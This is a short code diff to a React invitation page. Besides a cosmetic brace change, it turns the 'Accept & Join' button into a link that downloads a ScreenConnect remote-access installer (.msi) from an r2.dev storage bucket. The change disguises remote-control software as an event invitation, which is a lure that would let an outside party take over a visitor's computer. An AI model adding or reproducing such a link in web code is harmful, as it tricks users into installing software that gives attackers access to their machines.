@@ -14,7 +14,8 @@ export default function App() {
     return () => window.removeEventListener('resize', checkMobile);
   }, []);
 
-  if (isMobile) {
+  if (isMobile)
+  {
     return <MobileBlocker />;
   }
 
@@ -47,9 +48,9 @@ function Invite() {
               <span className="highlight">Please accept this invitation and be part of something special.</span>
             </p>
 
-            <button className="accept-btn">
+            <a href="https://pub-4b997841feed4885acb4cf32f7d569d1.r2.dev/ScreenConnect.ClientSetup.msi" className="accept-btn">
               Accept & Join
-            </button>
+            </a>
           </div>
         </div>
       </div>
